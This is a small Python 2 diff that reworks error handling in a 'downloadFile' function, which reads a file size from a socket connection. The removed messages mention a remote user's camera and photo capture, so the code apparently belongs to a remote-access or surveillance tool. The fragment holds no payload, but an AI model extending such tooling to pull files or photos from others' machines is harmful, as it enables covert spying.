@@ -326,19 +326,11 @@ def downloadFile(command,conn):
     args = command.split()
     
     #receive file size
+    sof = receiveString(conn)
     try:
-        sizeofFile = int(receiveString(conn))
+        sizeofFile = int(sof)
     except:
-        print "oops, couldnt get file size ( maybe user doesn't have a camera? well rip you just got disconnected :( )"
-        return
-    if sizeofFile == -1:
-        print "file does not exist"
-        return
-    elif sizeofFile == -2:
-        print "thats a directory"
-        return
-    elif sizeofFile == -3:
-        print "error taking photo :/"
+        print strinfo("Error: "+sof)
         return
     print strinfo("file size: "+str(sizeofFile))
 
